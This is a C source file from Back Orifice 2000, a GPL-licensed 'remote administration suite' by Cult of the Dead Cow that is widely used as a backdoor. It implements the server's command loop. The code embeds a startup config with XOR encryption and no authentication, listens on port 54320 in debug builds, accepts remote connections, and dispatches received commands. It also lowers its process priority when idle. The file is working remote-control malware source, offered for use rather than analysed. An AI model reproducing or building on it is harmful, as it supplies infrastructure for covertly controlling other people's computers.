/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<bocomreg.h>
#include<commnet.h>
#include<commandloop.h>
#include<config.h>


// ---------------- Global variables ----------------
CIOHandler *g_pIOHandler;
CEncryptionHandler *g_pEncryptionHandler;
CAuthHandler *g_pAuthHandler;

CAuthSocket *g_pCommSock[MAX_COMMAND_SOCKETS];
CAuthSocket *g_pConnSock[MAX_COMMAND_CONNECTIONS];
int g_nCommCount, g_nConnCount;

#ifdef NDEBUG
char g_szStartupOptions[]=	"<**CFG**>Startup\0"
							"S[8]:Init Cmd Net Type=TCPIO\0\0\0\0"
						    "S[48]:Init Cmd Bind Str=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
						    "S[8]:Init Cmd Encryption=XOR\0\0\0\0\0\0"
						    "S[8]:Init Cmd Auth=NULLAUTH\0"
						    "N[0,5000000]:Idle Timeout (ms)=60000\0\0";
#else
char g_szStartupOptions[]=	"<**CFG**>Startup\0"
							"S[8]:Init Cmd Net Type=TCPIO\0\0\0\0"
						    "S[48]:Init Cmd Bind Str=54320\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
						    "S[8]:Init Cmd Encryption=XOR\0\0\0\0\0\0"
						    "S[8]:Init Cmd Auth=NULLAUTH\0"
						    "N[0,5000000]:Idle Timeout (ms)=60000\0\0";
#endif

BOOL g_bBO2KFinished;		// Set this to -TRUE- when you want to exit BO2K

// ---------------- Function implementations --------------------

BOOL StartupCommandHandlers(void)
{
	char svParam[256];

	// Initialize primary command socket
	g_nCommCount=0;
	g_nConnCount=0;
	svParam[0]='\0';

	// Don't even start up unless user has configured a port to talk on.
	// This keeps the 31337 phenomena from happening.

	char *bindstr=GetCfgStr(g_szStartupOptions,"Init Cmd Bind Str");
	if(bindstr==NULL) return FALSE;
	if(bindstr[0]=='\0') {
		return FALSE;
	}

	CAuthSocket *cas;
	do {
		cas=ListenAuthSocket(NULL,0,NULL,
			bindstr,
			GetCfgStr(g_szStartupOptions,"Init Cmd Net Type"),
			GetCfgStr(g_szStartupOptions,"Init Cmd Encryption"),
			GetCfgStr(g_szStartupOptions,"Init Cmd Auth"));
	
		if(cas!=NULL && cas!=(CAuthSocket *)0xFFFFFFFF) {
			g_pCommSock[g_nCommCount]=cas;
			g_nCommCount++;	
			return TRUE;
		}
		Sleep(100);
	} while(cas!=NULL && cas!=(CAuthSocket *)0xFFFFFFFF);

	return FALSE;
}

void ShutdownCommandHandlers(void)
{
	int i;

	// Close all connections
	for(i=0;i<g_nConnCount;i++) {
		g_pConnSock[i]->Close();
		delete g_pConnSock[i];
	}

	// Terminate all bound sockets
	for(i=0;i<g_nCommCount;i++) {
		g_pCommSock[i]->Close();
		delete g_pCommSock[i];
	}
}


void CommandHandlerLoop(void)
{
	BYTE *buffer;
	int buflen,ret,i,j;
	DWORD dwLastTime,dwTimeout;
	BOOL bIdle;
	
	// Start the command handlers
	if(StartupCommandHandlers()==FALSE) return;

	// Lower Thread Priority
	SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);

	// Command handler loop
	g_bBO2KFinished=FALSE;
	dwLastTime=GetTickCount();
	dwTimeout=GetCfgNum(g_szStartupOptions,"Idle Timeout (ms)");
	bIdle=FALSE;
	
	while(!g_bBO2KFinished) {
		if(dwTimeout!=0) {
			if(!bIdle && ((GetTickCount()-dwLastTime)>dwTimeout)) {
				SetPriorityClass(GetCurrentProcess(),IDLE_PRIORITY_CLASS);
				SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_IDLE);
				bIdle=TRUE;
			}
		}
	
		// Sift through bound sockets looking for connections
		
		for(i=0; i<g_nCommCount; i++) {
			CAuthSocket *cas;
			cas=g_pCommSock[i]->Accept();
			if(cas!=NULL) {
				if(g_nConnCount<MAX_COMMAND_CONNECTIONS) {
					dwLastTime=GetTickCount();
					if(bIdle) {
						SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
						SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);
						bIdle=FALSE;
					}
					
					g_pConnSock[g_nConnCount]=cas;
					g_nConnCount++;
				} else {
					cas->Close();
					delete cas;	
				}
			}
		}
	
		// Sift through active connections pulling commands
		// and removing dead connections

		for(i=(g_nConnCount-1);i>=0;i--) {
			ret=g_pConnSock[i]->Recv(&buffer,&buflen);
			if(ret<0) {
				// Must be dead. Kill.
				g_pConnSock[i]->Close();
				delete g_pConnSock[i];
				
				for(j=i;j<(g_nConnCount-1);j++) {
					g_pConnSock[j]=g_pConnSock[j+1];
				}
				g_pConnSock[j]=NULL;
				g_nConnCount--;
			}
			else if(ret==0) {
				// Nothing here, move along
			}
			else {
				dwLastTime=GetTickCount();
				if(bIdle) {
					SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
					SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_LOWEST);
					bIdle=FALSE;
				}
				// Command received			
				int cmdlen,command,comid,nArg1;
				char *svArg2,*svArg3;

				BreakDownCommand(buffer, &cmdlen, &command, &comid, &nArg1, &svArg2, &svArg3);
				if(cmdlen==buflen) {
					DispatchCommand(command, g_pConnSock[i],comid,nArg1,svArg2,svArg3);
				}

				// Free command memory
				g_pConnSock[i]->Free(buffer);
			}
		}
		Sleep(20);
	}

	// Terminate command handlers
	ShutdownCommandHandlers();
}